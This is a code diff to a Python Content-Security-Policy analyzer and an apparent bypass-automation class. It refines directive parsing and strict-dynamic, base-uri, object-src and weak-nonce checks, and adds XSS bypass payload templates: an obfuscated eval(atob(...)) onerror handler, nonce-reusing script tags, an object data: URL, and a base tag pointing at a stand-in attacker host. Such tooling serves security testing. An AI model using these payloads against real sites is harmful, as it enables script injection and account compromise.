@@ -188,22 +188,55 @@ class CSPAnalyzer:
             'payload': '<script nonce="KNOWN_NONCE">alert(1)</script>',
             'description': 'Reuse valid nonce if predictable',
         },
+        'unsafe_eval': {
+            'technique': 'unsafe-eval bypass',
+            'payload': '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
+            'description': 'Dynamic code execution with unsafe-eval',
+        },
+        'strict_dynamic_gadget': {
+            'technique': 'strict-dynamic gadget',
+            'payload': '<script src="/static/app.js"></script>',
+            'description': 'A trusted script that consumes a DOM source creates script',
+        },
+        'weak_nonce': {
+            'technique': 'Weak nonce prediction',
+            'payload': '<script nonce="{nonce}">alert(1)</script>',
+            'description': 'Short or reused nonce lets an injected script borrow it',
+        },
+        'base_uri_hijack': {
+            'technique': 'base-uri hijack',
+            'payload': '<base href="https://attacker.tld/">',
+            'description': 'Missing base-uri redirects relative script loads',
+        },
+        'object_data': {
+            'technique': 'object data bypass',
+            'payload': '<object data="data:text/html,alert(1)"></object>',
+            'description': 'Missing object-src permits plugin/HTML objects',
+        },
     }
 
     def __init__(self) -> None:
         self._cache: Dict[str, CSPAnalysis] = {}
 
     def parse_csp(self, csp_header: str) -> Dict[str, List[str]]:
-        """Parse a CSP header into directive name -> list of tokens."""
+        """Parse a CSP header into directive name -> list of tokens.
+
+        Directive names are case-insensitive and duplicate directives are
+        merged (browsers apply every occurrence), so the normalization happens
+        here rather than at every call site.
+        """
         directives: Dict[str, List[str]] = {}
-        for directive in csp_header.split(';'):
+        for directive in str(csp_header or "").split(';'):
             directive = directive.strip()
             if not directive:
                 continue
             parts = directive.split()
-            directive_name = parts[0]
+            directive_name = parts[0].lower()
             values = parts[1:] if len(parts) > 1 else []
-            directives[directive_name] = values
+            if directive_name in directives:
+                directives[directive_name].extend(values)
+            else:
+                directives[directive_name] = list(values)
         return directives
 
     def analyze_csp(self, csp_header: str) -> CSPAnalysis:
@@ -215,16 +248,56 @@ class CSPAnalyzer:
         issues: List[CSPIssue] = []
         bypasses: List[CSPBypass] = []
 
-        # Check for missing required directives
-        for required in self.REQUIRED_DIRECTIVES:
-            if required not in directives:
-                issues.append(CSPIssue(
-                    issue_type="missing_directive",
-                    severity=CSPSeverity.HIGH,
-                    description=f"Missing {required} directive",
-                    directive=required,
-                    value=None,
-                ))
+        # Effective script policy: `script-src` falls back to `default-src`.
+        script_values = directives.get('script-src')
+        if script_values is None:
+            script_values = directives.get('default-src', [])
+        normalized_script = [value.strip().strip("'\"").lower() for value in script_values]
+        strict_dynamic = 'strict-dynamic' in normalized_script
+        nonce_values = [
+            value[len("nonce-"):]
+            for value in normalized_script
+            if value.startswith("nonce-")
+        ]
+        hash_present = any(
+            value.startswith(("sha256-", "sha384-", "sha512-"))
+            for value in normalized_script
+        )
+        # CSP3: with 'strict-dynamic' and a nonce/hash, browsers ignore both
+        # host allowlists and 'unsafe-inline'.  Treating 'unsafe-inline' as a
+        # direct bypass there is a false positive.
+        strict_dynamic_trusted = strict_dynamic and bool(nonce_values or hash_present)
+
+        # Check for a script policy at all.  Only one of the two directives is
+        # required; `default-src` is the documented fallback.
+        if 'script-src' not in directives and 'default-src' not in directives:
+            issues.append(CSPIssue(
+                issue_type="missing_directive",
+                severity=CSPSeverity.HIGH,
+                description="Missing script-src and default-src directives",
+                directive="script-src",
+                value=None,
+            ))
+
+        if strict_dynamic_trusted:
+            issues.append(CSPIssue(
+                issue_type="strict_dynamic",
+                severity=CSPSeverity.INFO,
+                description=(
+                    "script-src uses 'strict-dynamic'; host allowlists and "
+                    "'unsafe-inline' are ignored, so a trusted script gadget is "
+                    "the remaining route to execution"
+                ),
+                directive="script-src",
+                value="'strict-dynamic'",
+            ))
+            bypasses.append(CSPBypass(
+                technique=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['technique'],
+                payload_template=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['payload'],
+                description=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['description'],
+                target_directive=CSPDirective.SCRIPT_SRC,
+                confidence=0.5,
+            ))
 
         # Check for missing recommended directives
         for recommended in self.RECOMMENDED_DIRECTIVES:
@@ -236,6 +309,68 @@ class CSPAnalyzer:
                     directive=recommended,
                     value=None,
                 ))
+
+        # `base-uri` is the one recommended directive that is independently
+        # exploitable: an injected <base> re-points every relative script URL,
+        # defeating a strict script-src host allowlist.
+        if 'base-uri' not in directives:
+            issues.append(CSPIssue(
+                issue_type="missing_base_uri",
+                severity=CSPSeverity.HIGH,
+                description=(
+                    "Missing base-uri allows <base> injection to hijack "
+                    "relative script and stylesheet URLs"
+                ),
+                directive="base-uri",
+                value=None,
+            ))
+            bypasses.append(CSPBypass(
+                technique=self.BYPASS_TECHNIQUES['base_uri_hijack']['technique'],
+                payload_template=self.BYPASS_TECHNIQUES['base_uri_hijack']['payload'],
+                description=self.BYPASS_TECHNIQUES['base_uri_hijack']['description'],
+                target_directive=CSPDirective.BASE_URI,
+                confidence=0.8,
+            ))
+
+        # `object-src` falls back to `default-src`; report the bypass only when
+        # the effective policy still permits data: or a wildcard.
+        if 'object-src' not in directives:
+            object_fallback = [
+                value.strip().strip("'\"").lower()
+                for value in directives.get('default-src', [])
+            ]
+            if not object_fallback or any(
+                value in ('*', 'data:', 'http:', 'https:') for value in object_fallback
+            ):
+                bypasses.append(CSPBypass(
+                    technique=self.BYPASS_TECHNIQUES['object_data']['technique'],
+                    payload_template=self.BYPASS_TECHNIQUES['object_data']['payload'],
+                    description=self.BYPASS_TECHNIQUES['object_data']['description'],
+                    target_directive=CSPDirective.OBJECT_SRC,
+                    confidence=0.6,
+                ))
+
+        # Weak or missing nonce entropy makes nonce-based strict CSP bypassable.
+        for nonce in nonce_values:
+            if len(nonce) < 16:
+                issues.append(CSPIssue(
+                    issue_type="weak_nonce",
+                    severity=CSPSeverity.HIGH,
+                    description=(
+                        f"Nonce is only {len(nonce)} characters; short nonces are "
+                        "guessable and are commonly reused across responses"
+                    ),
+                    directive="script-src",
+                    value=f"nonce-{nonce}",
+                ))
+                bypasses.append(CSPBypass(
+                    technique=self.BYPASS_TECHNIQUES['weak_nonce']['technique'],
+                    payload_template=self.BYPASS_TECHNIQUES['weak_nonce']['payload'],
+                    description=self.BYPASS_TECHNIQUES['weak_nonce']['description'],
+                    target_directive=CSPDirective.SCRIPT_SRC,
+                    confidence=0.6,
+                ))
+                break
 
         # Check for dangerous values
         for directive, values in directives.items():
@@ -253,18 +388,39 @@ class CSPAnalyzer:
                 if matched_dangerous:
                     issues.append(CSPIssue(
                         issue_type="dangerous_value",
-                        severity=CSPSeverity.HIGH,
-                        description=f"{directive} contains dangerous value: {matched_dangerous}",
+                        severity=(
+                            CSPSeverity.LOW
+                            if matched_dangerous == 'unsafe-inline' and strict_dynamic_trusted
+                            else CSPSeverity.HIGH
+                        ),
+                        description=(
+                            f"{directive} contains dangerous value: {matched_dangerous}"
+                            + (
+                                " (ignored because 'strict-dynamic' is active)"
+                                if matched_dangerous == 'unsafe-inline' and strict_dynamic_trusted
+                                else ""
+                            )
+                        ),
                         directive=directive,
                         value=value,
                     ))
 
                     if matched_dangerous == 'unsafe-inline':
+                        if strict_dynamic_trusted:
+                            continue
                         bypasses.append(CSPBypass(
                             technique=self.BYPASS_TECHNIQUES['unsafe_inline']['technique'],
                             payload=self.BYPASS_TECHNIQUES['unsafe_inline']['payload'],
                             description=self.BYPASS_TECHNIQUES['unsafe_inline']['description'],
                             success_probability=0.9,
+                        ))
+                    elif matched_dangerous == 'unsafe-eval':
+                        bypasses.append(CSPBypass(
+                            technique=self.BYPASS_TECHNIQUES['unsafe_eval']['technique'],
+                            payload=self.BYPASS_TECHNIQUES['unsafe_eval']['payload'],
+                            description=self.BYPASS_TECHNIQUES['unsafe_eval']['description'],
+                            target_directive=CSPDirective.SCRIPT_SRC,
+                            confidence=0.7,
                         ))
                     elif matched_dangerous == '*':
                         bypasses.append(CSPBypass(
@@ -427,6 +583,13 @@ class CSPBypassAutomator:
             target_directive=CSPDirective.STYLE_SRC,
             confidence=0.6,
         ),
+        CSPBypass(
+            technique="unsafe_eval",
+            payload_template='<img src=x onerror="eval(atob(\'{m}\'))">',
+            description="unsafe-eval permits dynamic code execution",
+            target_directive=CSPDirective.SCRIPT_SRC,
+            confidence=0.7,
+        ),
     ]
 
     def __init__(self) -> None:
@@ -456,18 +619,45 @@ class CSPBypassAutomator:
         """Analyze CSP for exploitable weaknesses."""
         weaknesses: List[str] = []
         script_src = csp.get(CSPDirective.SCRIPT_SRC, [])
-        if 'unsafe-inline' in script_src:
-            weaknesses.append("script-src allows unsafe-inline")
-        if 'unsafe-eval' in script_src:
+        default_src = csp.get(CSPDirective.DEFAULT_SRC, [])
+        effective_script = script_src or default_src
+        normalized_script = [
+            str(value).strip().strip("'\"").lower() for value in effective_script
+        ]
+        if 'unsafe-inline' in normalized_script:
+            if 'strict-dynamic' in normalized_script and any(
+                value.startswith(("nonce-", "sha256-", "sha384-", "sha512-"))
+                for value in normalized_script
+            ):
+                weaknesses.append(
+                    "script-src sets unsafe-inline but 'strict-dynamic' makes "
+                    "browsers ignore it (trusted-script gadget required)"
+                )
+            else:
+                weaknesses.append("script-src allows unsafe-inline")
+        if 'unsafe-eval' in normalized_script:
             weaknesses.append("script-src allows unsafe-eval")
-        if '*' in script_src:
+        if '*' in normalized_script:
             weaknesses.append("script-src allows wildcard (*)")
-        if CSPDirective.SCRIPT_SRC not in csp:
-            default_src = csp.get(CSPDirective.DEFAULT_SRC, [])
-            if '*' in default_src:
-                weaknesses.append("No script-src directive, falls back to permissive default-src")
+        if not effective_script:
+            weaknesses.append("No script-src or default-src directive")
+        elif CSPDirective.SCRIPT_SRC not in csp and '*' in default_src:
+            weaknesses.append("No script-src directive, falls back to permissive default-src")
         if CSPDirective.OBJECT_SRC not in csp:
-            weaknesses.append("No object-src directive, object/embed may execute")
+            object_fallback = default_src
+            if not object_fallback or any(
+                str(value).strip().strip("'\"").lower() in ('*', 'data:', 'http:', 'https:')
+                for value in object_fallback
+            ):
+                weaknesses.append("No object-src directive, object/embed may execute")
+        if CSPDirective.BASE_URI not in csp:
+            weaknesses.append(
+                "No base-uri directive, <base> injection can hijack relative scripts"
+            )
+        for value in normalized_script:
+            if value.startswith("nonce-") and len(value) - len("nonce-") < 16:
+                weaknesses.append("Script nonce is short enough to be guessable/reused")
+                break
         if CSPDirective.REPORT_URI in csp:
             weaknesses.append("Legacy report-uri directive present (may be XSS vector)")
         return weaknesses
@@ -483,6 +673,26 @@ class CSPBypassAutomator:
 
         for bypass in self.BYPASS_TECHNIQUES:
             target_directive = bypass.target_directive or CSPDirective.SCRIPT_SRC
+
+            # `base-uri` has no default-src fallback: its absence is the
+            # weakness, so the technique applies whenever the directive is
+            # missing (or explicitly allows an attacker-reachable host).
+            if bypass.technique == "base_tag_injection":
+                if target_directive not in csp:
+                    applicable.append(bypass)
+                continue
+
+            # `object-src` does fall back to `default-src`; only a permissive
+            # effective policy is exploitable.
+            if bypass.technique == "object_data":
+                object_values = csp.get(CSPDirective.OBJECT_SRC, default_src)
+                if not object_values or any(
+                    str(value).strip().strip("'\"").lower() in ('*', 'data:', 'http:', 'https:')
+                    for value in object_values
+                ):
+                    applicable.append(bypass)
+                continue
+
             values = csp.get(target_directive, default_src)
             if not values:
                 continue
@@ -495,6 +705,10 @@ class CSPBypassAutomator:
                 applicable.append(bypass)
             elif bypass.technique == "angular_cdn" and any(
                 _source_allows_host(v, "ajax.googleapis.com") for v in values
+            ):
+                applicable.append(bypass)
+            elif bypass.technique == "unsafe_eval" and any(
+                _is_csp_keyword(v, "unsafe-eval") for v in values
             ):
                 applicable.append(bypass)
             elif bypass.technique == "iframe_sandbox" and any(
